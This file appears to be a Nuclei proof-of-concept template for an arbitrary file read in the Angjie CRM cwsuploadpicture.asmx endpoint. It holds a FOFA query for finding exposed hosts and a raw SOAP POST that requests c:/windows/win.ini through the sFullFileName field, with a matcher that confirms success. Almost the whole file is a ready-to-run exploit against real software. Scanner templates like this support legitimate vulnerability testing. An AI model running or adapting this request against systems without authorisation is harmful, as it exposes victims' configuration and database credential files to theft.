common/config/pocs/nuclei-2025/昂捷CRM-cwsuploadpicture.asmx-任意文件读取.yaml

id: angjieCRM-cwsuploadpicture_asmx-File-reading

info:
  name: 昂捷CRM cwsuploadpicture.asmx 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="CheckSilverlightInstalled" && body="AllowHtmlPopupwindow"
    昂捷CRM cwsuploadpicture.asmx 接口DownFileBytes实例处存在任意读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
  reference:
    - https://mp.weixin.qq.com/s/3HLETT938Vz3eJI4JxTq5g?token=1192656222&lang=zh_CN
  tags: File reading


http:
  - raw:
      - |
        POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetPicture"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetPicture xmlns="http://tempuri.org/">
              <sFullFileName>c:/windows/win.ini</sFullFileName>
            </GetPicture>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0'
      - type: status
        status: 
          - 200
